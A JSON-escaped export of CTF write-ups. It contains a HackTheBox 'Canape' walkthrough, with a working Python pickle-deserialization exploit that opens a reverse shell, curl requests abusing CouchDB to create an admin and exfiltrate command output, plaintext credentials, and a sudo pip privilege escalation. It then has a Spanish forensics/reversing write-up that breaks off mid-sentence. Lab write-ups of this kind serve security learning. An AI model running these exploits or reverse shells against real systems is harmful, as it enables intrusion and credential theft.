+ quote)[:10]\n                p_id = md5(char + quote).hexdigest()\n                outfile = open( /tmp/  + p_id +  .p ,  wb )\n        outfile.write(char + quote)\n        outfile.close()\n            success = True\n        except Exception as ex:\n            error = True\n\n    if error:\n        return  html p1 error /p1 /html \n    else:\n        return  html p1 success /p1 /html \n    #return  render_template( submit.html , error=error, success=success)\n\n@app.route( /check , methods=[ POST ])\ndef check():\n    print request.form[ id ]\n    path =  /tmp/  + request.form[ id ] +  .p \n    data = open(path,  rb ).read()\n\n    if  p1  in data:\n        item = cPickle.loads(data)\n    else:\n        item = data\n    print item\n    return  Still reviewing:   + item\n\nif __name__ ==  __main__ :\n    app.run(host= 0.0.0.0 )  (it may be a little modified, but the core parts are there.)\nSo with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this:   import requests\n#import base64\nfrom hashlib import md5\n\nPATH_REMOTE =  http://10.10.10.70/{} \nPATH_LOCAL =  http://192.168.0.15:5000/{} \nREMOTE = True\n\ndef submit_exploit(cmd):\n    action = 'submit'\n    char =  S'homer'\\np1\\ncos\\nsystem\\n(S'{cmd}'\\ntRS'marge'\\np1\\n .format(cmd=cmd)\n    quote = '.'\n    payload =  character={char} quote={quote} .format(char=char,quote=quote)\n    headers = {'Content-type': 'application/x-www-form-urlencoded'}\n    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)\n    print payload\n    r = requests.post(path, data=payload, headers=headers)\n    if r.status_code == 200 and ( thank you for your suggestion  in r.text.lower() or 'success' in r.text.lower()): \n        print  [+] Payload successfully sent. Command: {cmd} .format(cmd=cmd)\n        #return base64.encodestring(char+quote)[:10]\n        return md5(char+quote).hexdigest()\n    else:\n        print  [-] Error sending payload \n        raise Exception( Error sending payload: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body} .format(http_code= r.status_code, body=r.text))\n\ndef check_and_run_exploit(id_code):\n    action = 'check'\n    headers = {'Content-type': 'application/x-www-form-urlencoded'}\n    payload =  id={id_code} .format(id_code=id_code)\n    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)\n    r = requests.post(path, data=payload, headers=headers)\n    if r.status_code == 200: \n        print  [+] Exploit successfully executed \n        return r.text\n    else:\n        print  [-] Error executing exploit \n        raise Exception( Error executing exploit: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body} .format(http_code= r.status_code, body=r.text))\n\nif __name__ ==  __main__ :\n    cmd =  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\ 10.10.14.255\\ ,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\ /bin/sh\\ ,\\ -i\\ ]);' \n    id_code = submit_exploit(cmd)\n    check_and_run_exploit(id_code)  Two disclaimers:   The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail).  The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one.   After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc).   Although, we have a reverse shell, the user running the HTTP server is  www-data , so we need to escalate privileges and log in as other user. \nOnce inside the machine, my first move was to run  LinEnum.sh . Once of the outputs of it was the following:    I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a  BIG  troll.  Analyzing the applications running on the system and its ports, I found the  couchdb  running in localhost. \nI started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it:   $  curl -X GET http://localhost:5984\n{ couchdb : Welcome , version : 2.0.0 , vendor :{ name : The Apache Software Foundation }}  I started playing around a little more and figured it out how to list dbs and docs inside them:   $  curl -X GET http://localhost:5984/_all_dbs\n[ _global_changes , _metadata , _replicator , _users , passwords , simpsons ]\n$  curl -X GET http://localhost:5984/simpsons/_all_docs\n{ total_rows :7, offset :0, rows :[\n{ id : f0042ac3dc4951b51f056467a1000dd9 , key : f0042ac3dc4951b51f056467a1000dd9 , value :{ rev : 1-fbdd816a5b0db0f30cf1fc38e1a37329 }},\n{ id : f53679a526a868d44172c83a61000d86 , key : f53679a526a868d44172c83a61000d86 , value :{ rev : 1-7b8ec9e1c3e29b2a826e3d14ea122f6e }},\n{ id : f53679a526a868d44172c83a6100183d , key : f53679a526a868d44172c83a6100183d , value :{ rev : 1-e522ebc6aca87013a89dd4b37b762bd3 }},\n{ id : f53679a526a868d44172c83a61002980 , key : f53679a526a868d44172c83a61002980 , value :{ rev : 1-3bec18e3b8b2c41797ea9d61a01c7cdc }},\n{ id : f53679a526a868d44172c83a61003068 , key : f53679a526a868d44172c83a61003068 , value :{ rev : 1-3d2f7da6bd52442e4598f25cc2e84540 }},\n{ id : f53679a526a868d44172c83a61003a2a , key : f53679a526a868d44172c83a61003a2a , value :{ rev : 1-4446bfc0826ed3d81c9115e450844fb4 }},\n{ id : f53679a526a868d44172c83a6100451b , key : f53679a526a868d44172c83a6100451b , value :{ rev : 1-3f6141f3aba11da1d65ff0c13fe6fd39 }}\n$  curl -X GET http://localhost:5984/passwords/_all_docs\n{ error : unauthorized , reason : You are not a server admin. }  So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this  EXCELENT   blogpost . Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog).  I changed (just the names) a little bit the PoC of the blog and executed against the db:   $  curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{\n   type :  user ,\n   name :  tsuller ,\n   roles : [ _admin ],\n   roles : [],\n   password :  tsuller \n}'\n{ ok :true, id : org.couchdb.user:tsuller , rev : 1-0b547bb36cb610ec21d9571312f6e20c }  Yes! Seems that it worked! Lets check:  $  curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs\n{ total_rows :4, offset :0, rows :[\n{ id : 739c5ebdf3f7a001bebb8fc4380019e4 , key : 739c5ebdf3f7a001bebb8fc4380019e4 , value :{ rev : 2-81cf17b971d9229c54be92eeee723296 }},\n{ id : 739c5ebdf3f7a001bebb8fc43800368d , key : 739c5ebdf3f7a001bebb8fc43800368d , value :{ rev : 2-43f8db6aa3b51643c9a0e21cacd92c6e }},\n{ id : 739c5ebdf3f7a001bebb8fc438003e5f , key : 739c5ebdf3f7a001bebb8fc438003e5f , value :{ rev : 1-77cd0af093b96943ecb42c2e5358fe61 }},\n{ id : 739c5ebdf3f7a001bebb8fc438004738 , key : 739c5ebdf3f7a001bebb8fc438004738 , value :{ rev : 1-49a20010e64044ee7571b8c1b902cf8c }}\n]}  YES! Worked. Lets dump the content of each doc:  $  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4\n{ _id : 739c5ebdf3f7a001bebb8fc4380019e4 , _rev : 2-81cf17b971d9229c54be92eeee723296 , item : ssh , password : 0B4jyA0xtytZi7esBNGp , user : }\n$  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d\n{ _id : 739c5ebdf3f7a001bebb8fc43800368d , _rev : 2-43f8db6aa3b51643c9a0e21cacd92c6e , item : couchdb , password : r3lax0Nth3C0UCH , user : couchy }\n$  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f\n{ _id : 739c5ebdf3f7a001bebb8fc438003e5f , _rev : 1-77cd0af093b96943ecb42c2e5358fe61 , item : simpsonsfanclub.com , password : h02ddjdj2k2k2 , user : homer }\n$  curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738\n{ _id : 739c5ebdf3f7a001bebb8fc438004738 , _rev : 1-49a20010e64044ee7571b8c1b902cf8c , user : homerj0121 , item : github , password : STOP STORING YOUR PASSWORDS HERE -Admin }  If we pay atenttion to the  home  directory, we'll just find  homer  user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the  ssh  one) worked, and seconds later I was able to get the user flag:", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/canape/#root", 
            "text": "To start, I ran again the  LinEnum.sh  but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction.  In some moment, I thought that the couchdb was running as  root . I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also  couchy  (look the docs of the  password  db) was admin. \nThanks to this  blogpost  first, and a little help from  this  also I was able to successfully execute commands:   curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d ' whoami | curl http://10.10.14.255:5555 -d @- '  --insecure\ncurl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure\ncurl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{ _id : 770855a97726d5666d70a22173005c77 }' --insecure\ncurl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{ language : cmd , map : }' -H 'Content-Type: application/json' --insecure  Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the  whoami  wasn't root but homer. I must have confused with some other running process.   I continued looking for some interesting thing, but nothing showed up.   During that search, I issued:   sudo -l   And this was the output:\n![sudoers][./images/canape/sudoers.png]  For those not very familiar, this means that the user  homer  can run as  root  the command  pip install  without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this?  PIP  is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called  setup.py  which is the one in charge of really installing the package in your enviroment (virtual env or general env).   So my idea was to, download a compressed version of package that already exists (I pick  request  because is my favourite lib), modify it's code, compress it again and try to install it using sudo:   Downloaded the source code from  here .  Decompressed it.  Added the following line to the setup.py:   os.system('cat /root/root.txt   /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p')  (I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes)  Compressed it again.  Served it in a python serve so you can copy it to the machine .\n* Executed:  sudo /usr/bin/pip install blablabla.tar.gz   Read the flag from  /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p  Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/own/eko2017/kidnapped/", 
            "text": "Coming Soon..", 
            "title": "Kidnapped"
        }, 
        {
            "location": "/ctfs/own/eko2017/kidnapped/#coming-soon", 
            "text": "", 
            "title": "Coming Soon.."
        }, 
        {
            "location": "/ctfs/own/eko2018/kidnapped_revenge/", 
            "text": "Kidnapped\n\n\n\n\nCategory: Miscellaneous\n\n\nPoints: 500/500\n\n\n\n\nEnunciado\n\n\nParece un chiste.. \nEl a\u00f1o pasado me hicieron lo mismo. Me queda tiempo hasta el 28 de septiembre para entregar un trabajo de la misma materia (que recurs\u00e9 ya que nadie pudo ayudarme el a\u00f1o pasado) \"Programaci\u00f3n en assembler\". Ya estoy empezando a sospechar que alguno de ustedes me quiere hacer pasar muchos malos momentos. \n\n\nEn fin.. me pas\u00f3 algo muy parecido al a\u00f1o pasado. Hab\u00eda terminado con el trabajo, estaba por hacer un backup, cuando de repente.. mi pc se volvi\u00f3 loca. Aparecieron archivos, archivos mios se borraron, ahora hay archivos con extensiones \".enc\" ... no entiendo nada. \n\n\nPor favor, dame una mano con esto. Necesito de una vez por todas terminar esta materia. El que me hizo esto, me dej\u00f3 una nota.. Capaz eso les ayuda? \nLes dejo un pedazo (fijense que pesa solo 15 MB, osea no trabajen sobre esa imagen porque se van a quedar sin lugar) de mi disco. Espero que les sirva de algo. \nGracias\n\n\nFile\n\n\ndisk img\n\n\nParte 1: Desencriptando files\n\n\nEl challenge simplemente provee una imagen de un disco. \nPor lo tanto, montemos esta imagen: \n\n\nsudo mount -o rw file.img /mnt/challenge\n\n\n\n\nEjecutemos un \nls -R\n para ver que files interesantes tenemos:\n\n\n\n\nParece ser un home directory de alguna distribuci\u00f3n de Linux. Adem\u00e1s, de las carpetas por defecto, parece ser que s\u00f3lo 3 files son interesantes:\n\n\n\n\nplay_for_the_key.enc\n\n\ntarea_secuestrada.asm.zip.enc\n\n\nnota\n\n\n\n\nLa nota, dice:\n\n\nNo es f\u00e1cil terminar esta materia... te habr\u00e1s dado cuenta.. pensaste que como ya te hab\u00eda pasado el a\u00f1o pasado este a\u00f1o no te iba a volver a pasar? jaj, pobre.\n\nConsejo de amigos... aprend\u00e9 un poco m\u00e1s a proteger tu pc... \n\nEl a\u00f1o pasado te ayud\u00e9 bastante.. este a\u00f1o.. estas solito.. solo un consejo te voy a dar si queres volver a obtener tu tarea: \n\n                        \nHay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\n.\n\nEspero que sepas darte cuenta cuando haya que aplicar este principio.\n\nMucha suerte..\nAh, casi me olvidaba, te volv\u00ed a modificar un poco tu tarea asique.. vas a tener que arreglarla otra vez.. \nSaludos\n\n\n\n\nLo \u00fanico interesante ac\u00e1 parece ser la frase: \n\"Hay veces, que romper es mucho m\u00e1s dificil que aprender a jugar\"\n.\n\n\nIgulamente por ahora, no parece ser \u00fatil. \n\n\nUsando el comando \nls\n, no vamos a listar los archivos ocultos. Si usamos el flag \n\"-a\"\n  vamos a encontrar en el home, un file bastante interesante, el \nbash_history\n con el siguiente contenido:\n\n\nwhoami\ncd Desktop/\nls\ncat /etc/passwd\nsudo su - \ncd /home/\nsu - eldiegomaradona\nsu - elcharliedelapeople\ncrontab -e \ncd /home/alumno/\ncd facu/\ncd programacion_assembler/\ncd tarea_final/\nvim play_for_key.c\nmovcc play_for_key -o play_for_key\nvim simd.asm\nzip -er tarea_secuestrada.asm.zip simd.asm\nrm -rf simd.asm play_for_key.c\nopenssl enc -aes-256-cbc -in tarea_secuestrada.asm.zip -out tarea_secuestrada.asm.zip.enc\nopenssl enc -aes-256-cbc -in play_for_key -out play_for_key.enc\nrm -rf play_for_key\nrm -rf tarea_secuestrada.asm.zip\nvim nota\ncd ~\nrm .bash*\nlogout\n\n\n\n\nPor lo que vemos, el atacante:\n\n\n\n\nTrat\u00f3 de loguearse con algunos usuarios.\n\n\nAbri\u00f3 el file de configuraci\u00f3n de los crons, habr\u00e1 modificado algo? (no tenemos nada para confirmarlo).\n\n\nCre\u00f3/edit\u00f3 un file llamado play_for_key.c (\nvim play_for_the_key.c\n).\n\n\nLo compilo? Con algo raro? (\nmovcc play_for_key -o play_for_key\n).\n\n\nCre\u00f3/edit\u00f3 un file llamado simd.asm, ser\u00e1 la tarea? (\nvim simd.asm\n) .\n\n\nZipea el file con password, y ac\u00e1 podemos confirmar que es la tarea (\nzip -er tarea_secuestrada.asm.zip simd.asm\n).\n\n\nElimina los files con c\u00f3digo fuente (\nrm -rf simd.asm play_for_key.c\n).\n\n\nEncripta ambos files, sin proporcionar password! (\nambas lineas de openssl\n)\n\n\nElimina dicho files, es decir, s\u00f3lo deja los encriptados (\nambas lineas de rm\n)\n\n\nElimina todo los files que comiencen con .bash (\nrm .bash\n)\n\n\n\n\nSi tratamos de desencriptar los files de extensi\u00f3n .enc, no vamos a poder ya que nos pide una password. Dado que en los comandos para encriptar los files no se utiliz\u00f3 el flag \n\"-k\"\n, para especificar la password en el comando propiamente, entonces podemos asumir que la password fue ingresada en modo interactivo, y por lo tanto no va a haber registro de ella.\n\n\nUna de las posibilidades ac\u00e1 seria tratar de bruteforcear la password... Pero en general, al menos desde mi punto de vista, yo har\u00eda esto cuando se me acaban las opciones. \n\n\nEn este caso, podemos ver que se borraron varios archivos. Por lo tanto, podr\u00edamos usar alguna suite de forensia con el objetivo de recuperar los files eliminados, como por ejemplo, \nphotorec\n. \n\n\nCon photorec, se puede recuperar al menos un archivo. Ese archivo, parece ser el \n.bashrc\n del usuario, y entre sus l\u00edneas, tiene lo siguiente:\n\n\n# enable some nice features\nopenssl(){\n    ba=$4\n    /usr/bin/openssl $1 $2 $3 $4 $5 $6 -k $(for i in {1..100}; do echo -n ${#ba}; done)\n}\n\n\n\n\nEsto quiere decir que, basicamente, el atacante cre\u00f3 un alias con el mismo nombre que el comando \nopenssl\n, redefiniendo su acci\u00f3n. En resumen, lo que esta haciendo eso, es agregar la password de encripci\u00f3n con el flag \n\"-k\"\n cada vez que se llama al comando \nopenssl\n. Dicha password es la longitud del nombre del file pasado por par\u00e1metro, repetido 100 veces. La longitud del string \nplay_for_the_key\n es 16 y de \ntarea_secuestrada.asm.zip\n es 25. Por lo tanto, los siguientes comandos, vamos a poder desencriptar ambos files:\n\n\n/usr/bin/openssl enc -d -aes-256-cbc -in tarea_secuestrada.asm.zip.enc -out tarea_secuestrada.asm.zip -k 25252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525252525\n\n/usr/bin/openssl enc -d -aes-256-cbc -in play_for_the_key.enc -out play_for_the_key -k 16161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616\n\n\n\n\nTener que la salida de estos comandos deber\u00eda ser almacenada afuera del disco, ya que s\u00f3lo tiene 15 MB\n\n\nParte 2: Jugar, a veces es m\u00e1s facil\n\n\nEn este momento tenemos 2 files imporatantes:\n\n \nplay_for_the_key\n: Un binario de 32 bits. Que cuando lo ejecutamos parece que nos pide respuestas a unas \"preguntas\". \n\n \ntarea_secuestrada.zip\n: Un archivo ZIP con password. \n\n\nEn este momento uno podr\u00eda tratar de bruteforcear la password del ZIP quiz\u00e1s usando JTR o Hashcat o cualquier otra tool para crackear password de un ZIP. Pero, dado que existe un binario con un nombre bastante claro, se puede intuir que el camino al menos l\u00f3gico, ser\u00eda tratar de conseguir la key usando dicho binario. \n\n\nPlay for the key\n\n\nCuando ejecutamos el binario, el siguiente mensaje aparece:\n\n\nIngresa la respuesta n\u00famero 1:\n\n\n\n\nA esta altura no tenemos ni idea que significa esto. Si empezamos a probar y fallamos, el mensaje \n\"Nop!\"\n se imprimir\u00e1 en la pantalla. En cambio, si ponemos la respuesta correcta, nos pedir\u00e1 la respuesta a la siguiente pregunta:\n\n\n\n\nPero \u00bfC\u00f3mo sabemos cuantas pregunta son? \u00bfCu\u00e1l es la repuesta correcta? \n\n\nUna opci\u00f3n v\u00e1lida en este momento ser\u00eda tratar de reversear el binario y ver qu\u00e9 est\u00e1 haciendo. Para este ejemplo, voy a usar \nBinary Ninja\n. Sin embargo, cuando vamos a ver el graph view del binario, vemos algo bastante extra\u00f1o.. Solo existe un basic block. Si seguimos mirando, vamos a notar que s\u00f3lo hay instrucciones \nMOV\n:\n\n\n\n\n\u00bfQu\u00e9 est\u00e1 pasando?. Si volvemos atr\u00e1s un poco y revisamos otra vez el \nbash_history\n vamos a darnos cuenta que este binario fue compilado usando un comando llamado \nmovcc\n. El primer resultado de la b\u00fasqueda de dicho comando en Google, nos lleva a un github de una tool llamada \nmovfuscator\n. Seg\u00fan su documentaci\u00f3n, esta compila un c\u00f3digo fuente en un binario de s\u00f3lo instrucciones \nMOV\n. Si bien desde un punto de performance y hasta de espacio que ocupa dicho binario, es bastante malo, al estar escrito s\u00f3lo con instrucciones \nMOV\n el reversing de este binario se vuelve muchisimo m\u00e1s tedioso. \n\n\nY aqu\u00ed se abren dos caminos:\n1. Encontramos una tool para de-movfuscar el binario.\n2. Hacemos uso del msj de la nota, y JUGAMOS en vez de tratar de romper el juego. \n\n\nVamos a ir por la opci\u00f3n 2: \n\n\nLuego de probar un poco con algunos valores que ingresamos como respuestas, vamos a notar que:\n1. Para 1, la respuesta es 1.\n2. Para 2, la respuesta es 2. \n3. Para 3, la respuesta es 1. \n4. Para 4, la respuesta es 1.\n5. Para 5, la respuesta es 2.\n6. Para 6, la respuesta es 1. \n7. Para 7, la respuesta es 2.\n8. Para 8, la respuesta es 1. \n9. Para 9, la respuesta es 2.\n10. Para 10, la respuesta es 3. \n11. Para 11, la respuesta es 4.\n12. Para 12, la respuesta es 1.\n\n\nSi observamos con detalle, podemos ver que el la respuesta es un numero que empieza a aumentar pero en ciertos valores vuelve a uno. Dichos valores son: 2, 3, 5, 7, 11, etc.\n\n\nEs decir, parece ser un contador que cuando el n\u00famero de la pregunta es uno de esos, el contador se resetea y vuelve a empezar de 1.\n\n\nPero \u00bfQu\u00e9 tienen de com\u00fan estos n\u00fameros? \nSON PRIMOS!!\n\n\nTodav\u00eda no sabemos qu\u00e9 cantidad de preguntas hay, pero igualmente, podemos hacer un script que imprima un contador y que cada vez que se cruza con un n\u00famero primo, vuelva a 1. Dado que no sabemos la cantidad, podemos ir probando hasta que la encontremos. Yo arranqu\u00e9 con 15, y faltaban mas. Mi siguiente paso fue probar con 1000, y funcion\u00f3. La cantidad de preguntas finalmente eran 100. \n\n\nSolucionador\n\n\nprimos = []\ncontador = 1\nnumero_de_pregunta = 1\nposible_numero_de_preguntas = 1000\nfor numero_de_pregunta in xrange(1,posible_numero_de_preguntas):\n        print contador\n        if any((numero_de_pregunta % primo) == 0 for primo in primos) or numero_de_pregunta == 1:\n                contador += 1\n        else:\n                contador = 1\n                primos.append(numero_de_pregunta)\n\n\n\n\nIntento con 15 primos\n\n\n\n\nIntento con 1000 primos\n\n\n\n\nSi intentamos descomprimir el ZIP con esa clave, vamos a obtener un \u00faltimo file \nsimd.asm\n, que es la \u00faltima parte del challenge. \n\n\nParte 3: Programaci\u00f3n en assembler\n\n\nLa \u00faltima parte del challenge implica tratar de entender qu\u00e9 hizo el atacante (qu\u00e9 modific\u00f3) para poder volver hacer que funcione otra vez. \n\n\nEl file original contiene:\n\n\n nasm -f elf64 simd.asm; ld -o simd simd.o\nsection     .text\nglobal      _start                              \n\n_start:                                         \n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n    punpckhwd xmm1, xmm9   \n    punpckhwd xmm2, xmm9   \n    punpcklwd xmm3, xmm9   \n    punpckhwd xmm4, xmm9   \n    punpcklwd xmm5, xmm9   \n    punpcklwd xmm6, xmm9   \n    punpcklwd xmm7, xmm9   \n    punpckhwd xmm8, xmm9\n    punpcklwd xmm10, xmm9\n    punpckhwd xmm9 ,xmm11\n\n\n    psubw xmm1, xmm10\n    psubw xmm2, xmm11\n    psubw xmm3, xmm10\n    psubw xmm4, xmm11\n    psubw xmm5, xmm10\n    psubw xmm6, xmm11\n    psubw xmm7, xmm10\n    psubw xmm8, xmm11\n\n    packuswb xmm1, xmm2 \n    packuswb xmm3, xmm4 \n    packuswb xmm5, xmm6 \n    packuswb xmm7, xmm8 \n\n\n    movdqu [Parallel_processing], xmm1\n    movdqu [is_much_faster...You_know?], xmm3\n    movdqu [but_sometimes_is_difficult], xmm5\n    movdqu [to_understand_how_it_works.], xmm7\n\n    mov     ecx, Parallel_processing  \n    mov     edx, 0x40\n    mov     ebx,1                               \n    mov     eax,4                               \n    int     0x80                                \n\n    mov     eax,1                               \n    int     0x80                                \n\n\nsection     .data\nParallel_processing dq 0x7e7618131b332312, 0xb5db2d5e4333690e\nis_much_faster...You_know? dq 0x487bdfe02d301eee, 0x9db0232038f9321e\nbut_sometimes_is_difficult dq 0x4a47dbdf5e07f2f5, 0x6caaef1f3ef1312f\nto_understand_how_it_works. dq 0x5078dd0e61071ff0, 0x5a9adf0f28e0206b\nAnyways_I_trust_you... dq 0x1715ABADFACEBABE\nWhats_wrong_in_this_code? dq 0x3A7ABEEF08C0FFEE \n\n\n\n\nLo m\u00e1s imporante ac\u00e1 es entender qu\u00e9 est\u00e1 haciendo este c\u00f3digo, al menos una idea a alto nivel para despu\u00e9s ahondar en cada detalle. \nDividamos el c\u00f3digo en partes:\n\n\nAn\u00e1lisis de c\u00f3digo - Parte 1\n\n\n\n    movdqu  xmm1, [Parallel_processing]\n    movdqu  xmm3, [is_much_faster...You_know?]\n    movdqu  xmm5, [but_sometimes_is_difficult]\n    movdqu  xmm7, [to_understand_how_it_works.]\n    movdqu  xmm10, [Anyways_I_trust_you...]\n\n    movdqu  xmm2, xmm1\n    movdqu  xmm4, xmm3\n    movdqu  xmm6, xmm5\n    movdqu  xmm8, xmm7\n    movdqu  xmm11, xmm10\n\n    pxor xmm9, xmm9\n\n\n\n\nEn esta parte, simplemente est\u00e1 copiando el contenido de las etiquetas a los registros XMM (16 bytes). Luego, hace una de cada una de ellos, dejando el mismo contenido de a pares. Es decir, \nxmm1\n tiene el mismo valor que \nxmm2\n, \nxmm3\n el mismo que \nxmm4\n, etc.. Por \u00faltimo, \nxmm9\n lo pone en 0. \n\n\nAn\u00e1lisis de c\u00f3digo - Parte 2\n\n\npunpckhwd xmm1, xmm9   \npunpckhwd xmm2, xmm9   \npunpcklwd xmm3, xmm9   \npunpckhwd xmm4, xmm9   \npunpcklwd xmm5, xmm9   \npunpcklwd xmm6, xmm9   \npunpcklwd xmm7, xmm9   \npunpckhwd xmm8, xmm9\npunpcklwd xmm10, xmm9\npunpckhwd xmm9 ,xmm11\n\n\n\n\nEn esta segunda parte, se puede observar dos instrucciones distintas:\n\n \npunpckhwd\n\n\n \npunpcklwd\n\n\n\u00c9stas, son parte de un conjunto de instrucciones (SSE) usados para procesamiento paralelo. \nGoogleando un poco, se puede encontrar que la funci\u00f3n \npunpckhwd\n divide los registros, tanto fuente como destino, en words (2 bytes) (por eso la ante \u00faltima letra, \nw\n). Toma las words que est\u00e1n en la parte high (por eso la letra \nh\n antes de la \nw\n) de ambos registros, y los intercala. \n\n\nLo imporante de esta parte, no es tanto entrar en detalle de c\u00f3mo es que se intercalan estrictamente, sino m\u00e1s que nada entender que: \n\n\n\n\nSe est\u00e1 unpackeando words\n\n\nSe est\u00e1 unpackeando o bien la parte high, o bien la parte low.\n\n\nCasi\n todas ellas se est\u00e1n unpackeando con 0 (\nxmm9\n es 0).\n\n\n\n\nSi recordamos lo que se hizo en la primera parte, hab\u00eda pares de registros \nxmm\n que tenian el mismo valor. Si bien vemos casos en la parte 2, donde se est\u00e1 unpackeando la parte high y low de un mismo valor de registros (por ejemplo, para \nxmm3\n y \nxmm4\n), tambi\u00e9n vemos casos donde se hace dos veces la parte high (\nxmm1\n y \nxmm2\n). Raro..\n\n\nAdem\u00e1s, vemos que la \u00faltima intrucci\u00f3n, parece unpackear al rev\u00e9s, es decir, usando el \nxmm9\n como registro fuente y no como destino. Otra cosa para anotar.\n\n\nAn\u00e1lisis de c\u00f3digo - Parte 3\n\n\npsubw xmm1, xmm10\npsubw xmm2, xmm11\npsubw xmm3, xmm10\npsubw xmm4, xmm11\npsubw xmm5, xmm10\npsubw xmm6, xmm11\npsubw xmm7, xmm10\npsubw xmm8, xmm11\n\n\n\n\nOtra instrucci\u00f3n del mismo set de procesamiento paralelo. En este caso esta instrucci\u00f3n hace una resta word a word de cada registro y almacena el resultado en el registro destino. \n\n\nObsevado este pedazo de c\u00f3digo, se puede intuir que ni \nxmm11\n ni \nxmm10\n son usados dos veces con el mismo par de registros. Es decir, todo par de registros usa una vez \nxmm10\n y una vez \nxmm11\n. \nDe hecho, por el orden y lo n\u00fameros de regitros, podr\u00edamos llegar a pensar que \nxmm10\n es siempre usado para la parte \nlow\n de los pares de registros y \nxmm11\n para la parte \nhigh\n.\n\n\nAn\u00e1lisis de c\u00f3digo - Parte 4\n\n\npackuswb xmm1, xmm2 \npackuswb xmm3, xmm4 \npackuswb xmm5, xmm6 \npackuswb xmm7, xmm8 \n\n\n\n\nPor \u00faltimo, en esta parte, se hace el packeo otra vez para volver a la \"normalidad\". Cada par de registros, se packean juntos. \nSin embargo, dicho packeo, se hace de word a byte (por eso \nwb\n a lo \u00faltimo) cuando el unpackeo se hizo de word a double word... raro.. \n\n\nAn\u00e1lisis de c\u00f3digo - Parte 5\n\n\nmovdqu [Parallel_processing], xmm1\nmovdqu [is_much_faster...You_know?], xmm3\nmovdqu [but_sometimes_is_difficult], xmm5\nmovdqu [to_understand_how_it_works.], xmm7\n\n\n\n\nSe escribe dichas posiciones de memoria el valor que tienen algunos (los representantes de cada par?) de los \nxmm\n despu\u00e9s de hacer las operaciones. \n\n\nAn\u00e1lisis de c\u00f3digo - Parte 6\n\n\nmov     ecx, Parallel_processing  \nmov     edx, 0x40\nmov     ebx,1                               \nmov     eax,4                               \nint     0x80                                \n\nmov     eax,1                               \nint     0x80                                \n\n\n\n\nFinalmente, imprime por pantalla los 64 bytes que tenga la posici\u00f3n de memoria apuntada por la etiqueta \nParallel_processing\n. \n\n\nAn\u00e1lisis de c\u00f3digo - Resumen\n\n\nHay al menos 3 cosas que parecen raras: \n\n\n\n\nEn el momemto de unpackear, hay algunos pares de registros que se unpackea la misma parte (high o low). \n\n\nEn una instrucci\u00f3n de unpackeo, se usa el \nxmm9\n como registro destino (no consistente con todo lo anterior).\n\n\nEn el momento de packear, si bien se hab\u00eda unpackeado de word a double word, se packea de word a byte.\n\n\n\n\nAl ser un ejercicio de \"patching\", no queda otra que ir probando los cambios a ver como afectan. Igualmente, as\u00ed como fuimos intuyendo a lo largo del texto, podr\u00edamos hacer los cambios para l\u00f3gicos:\n\n\n\n\nCada par deberia unpackear la parte low y la parte high. C\u00f3mo saber cual deber\u00eda, podr\u00edamos probar. Sin embargo, por c\u00f3mo est\u00e1 escrito el c\u00f3digo, vamos a optar por 